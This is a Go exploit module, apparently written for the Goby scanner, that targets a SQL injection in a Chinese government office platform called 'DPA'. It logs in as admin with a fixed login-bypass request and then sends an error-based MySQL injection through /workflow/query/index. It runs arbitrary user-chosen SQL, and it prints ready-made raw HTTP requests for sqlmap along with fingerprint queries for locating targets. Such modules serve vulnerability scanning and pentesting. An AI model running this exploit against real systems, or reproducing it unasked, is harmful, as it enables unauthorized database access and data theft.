package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Digital Cloud Platform Smart Government DPA /index SQL Injection Vulnerability",
    "Description": "<p>Beijing Digital Communication Software Co., Ltd. (hereinafter referred to as Digital Communication) is an industry-leading digital office software provider, relying on the collaborative office series management software as the basic platform to help enterprises optimize asset allocation and improve operational efficiency. </p><p>The parameters submitted by the user are directly spliced into the SQL statement for execution without filtering in the DPA program of the digital cloud platform, resulting in the special characters in the parameters destroying the original logic of the SQL statement, and the attacker can exploit this vulnerability to execute any SQL statement, such as querying data, downloading data, writing to webshell, executing system commands, and bypassing login restrictions.</p>",
    "Product": "Digital Cloud Platform Smart Government DPA",
    "Homepage": "http://sztbj.com/product/download.php",
    "DisclosureDate": "2024-10-15",
    "PostTime": "2024-10-18",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/assets/8cca19ff/css/bootstrap-yii.css\" && body=\"/assets/8cca19ff/css/bootstrap-notify.css\"",
    "GobyQuery": "body=\"/assets/8cca19ff/css/bootstrap-yii.css\" && body=\"/assets/8cca19ff/css/bootstrap-notify.css\"",
    "Level": "1",
    "Impact": "<p>The parameters submitted by the user are directly spliced into the SQL statement for execution without filtering in the DPA program of the digital cloud platform, resulting in the special characters in the parameters destroying the original logic of the SQL statement, and the attacker can exploit this vulnerability to execute any SQL statement, such as querying data, downloading data, writing to webshell, executing system commands, and bypassing login restrictions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://hacktwo.blog.csdn.net/article/details/142953120"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT VERSION()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "数字通云平台智慧政务DPA /index SQL 注入漏洞",
            "Product": "数字通云平台智慧政务DPA",
            "Description": "<p>北京数字通软件有限公司(简称数字通)是业界领先的数字化办公软件提供商,依托协同办公系列管理软件为基础平台，帮助企业优化资产配置，提升运营效率。<br></p><p>数字通云平台智慧政务DPA程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>数字通云平台智慧政务DPA程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等.<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Digital Cloud Platform Smart Government DPA /index SQL Injection Vulnerability",
            "Product": "Digital Cloud Platform Smart Government DPA",
            "Description": "<p>Beijing Digital Communication Software Co., Ltd. (hereinafter referred to as Digital Communication) is an industry-leading digital office software provider, relying on the collaborative office series management software as the basic platform to help enterprises optimize asset allocation and improve operational efficiency.&nbsp;</p><p>The parameters submitted by the user are directly spliced into the SQL statement for execution without filtering in the DPA program of the digital cloud platform, resulting in the special characters in the parameters destroying the original logic of the SQL statement, and the attacker can exploit this vulnerability to execute any SQL statement, such as querying data, downloading data, writing to webshell, executing system commands, and bypassing login restrictions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The parameters submitted by the user are directly spliced into the SQL statement for execution without filtering in the DPA program of the digital cloud platform, resulting in the special characters in the parameters destroying the original logic of the SQL statement, and the attacker can exploit this vulnerability to execute any SQL statement, such as querying data, downloading data, writing to webshell, executing system commands, and bypassing login restrictions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	setSqlPayloadHashashdcgyasjcgyjhajscghgeatueefvaxbcasnhcajhdahsukgbhxjccrefrms := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?WfRtApplication%5Brun_id%5D=&WfRtApplication%5Bsearch_name%5D=&WfRtApplication%5Bworkflow_name%5D=&WfRtApplication%5Bdate%5D=&WfRtApplication%5Bselect_type%5D=all&WfRtApplication%5Bselect_user%5D=1%20AND%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x7e7e,(" + sql + "),0x7e,0x78))s),%208446744073709551610,%208446744073709551610)))&ajax=process-grid")
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		cookieRequest := httpclient.NewPostRequestConfig("/portal/default/login")
		cookieRequest.FollowRedirect = false
		cookieRequest.VerifyTls = false
		cookieRequest.Timeout = 15
		cookieRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cookieRequest.Data = "userID=admin&flag=rone"
		resp, err = httpclient.DoHttpRequest(hostInfo, cookieRequest)
		if err != nil || resp.StatusCode != 302 {
			return resp, "", err
		}
		// 查找包含 "Set-Cookie:" 的行并提取它们
		lines := strings.Split(resp.HeaderString.String(), "\n")
		cookie := ""
		for _, line := range lines {
			if strings.HasPrefix(strings.TrimSpace(line), "Set-Cookie:") {
				// 去掉 "Set-Cookie: " 前缀并打印剩余内容
				cookie += strings.TrimSpace(strings.TrimPrefix(line, "Set-Cookie:")) + ";"
			}
		}

		urlget := "/workflow/query/index"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{"Cookie": cookie})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/workflow/query/index"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "c72decc0a16932f21ab2a090af1aa21d"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT md5('aasfcacxaasdcaxas')`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `~~([\s\S]*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashashdcgyasjcgyjhajscghgeatueefvaxbcasnhcajhdahsukgbhxjccrefrms
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `First get Cookie:
POST /portal/default/login HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: GOASESSID=teee69jht7234nr1ei5uuutiu7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

userID=admin&flag=rone

Then get SQL Injection:
GET /workflow/query/index?WfRtApplication%5Brun_id%5D=&WfRtApplication%5Bsearch_name%5D=&WfRtApplication%5Bworkflow_name%5D=&WfRtApplication%5Bdate%5D=&WfRtApplication%5Bselect_type%5D=all&WfRtApplication%5Bselect_user%5D=1%20AND%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x7e7e,(SELECT+md5%28%27aasfcacxaasdcaxas%27%29),0x7e,0x78))s),%208446744073709551610,%208446744073709551610)))&ajax=process-grid HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cookie: GOASESSID=uig1mbd484ifp9cphll3cp0t53; path=/;547c60d261f986d0cbe500790da2a86d=634aa9c48c485a374386d4c987c94c60b98c4b21a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3Bi%3A2%3Bi%3A3600%3Bi%3A3%3Ba%3A24%3A%7Bs%3A7%3A%22user_id%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22uuid%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22user_name%22%3Bs%3A15%3A%22%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%22%3Bs%3A6%3A%22byname%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22cert_sn%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22gender%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22avatar%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22status%22%3Bs%3A1%3A%220%22%3Bs%3A9%3A%22signature%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22msg_sound%22%3Bs%3A1%3A%221%22%3Bs%3A15%3A%22folder_capacity%22%3Bs%3A1%3A%220%22%3Bs%3A14%3A%22email_capacity%22%3Bs%3A1%3A%220%22%3Bs%3A12%3A%22weather_city%22%3Bs%3A20%3A%22%E5%8C%97%E4%BA%AC_%E5%8C%97%E4%BA%AC_%E5%8C%97%E4%BA%AC%22%3Bs%3A3%3A%22org%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22position%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22role%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22main_role%22%3Bi%3A0%3Bs%3A10%3A%22other_role%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22main_position%22%3Bi%3A0%3Bs%3A14%3A%22other_position%22%3Bs%3A1%3A%220%22%3Bs%3A10%3A%22operations%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22independent%22%3Bb%3A0%3Bs%3A4%3A%22skin%22%3Bs%3A24%3A%22reTopTheme2+reLeftTheme2%22%3Bs%3A5%3A%22theme%22%3Bs%3A7%3A%22concise%22%3B%7D%7D; expires=Fri, 18-Oct-2024 07:16:16 GMT; path=/;

`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `~~([\s\S]*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashashdcgyasjcgyjhajscghgeatueefvaxbcasnhcajhdahsukgbhxjccrefrms
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT database()"
					} else if way == "db_version" {
						sql = "SELECT version()"
					} else if way == "user_name" {
						sql = "SELECT user()"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
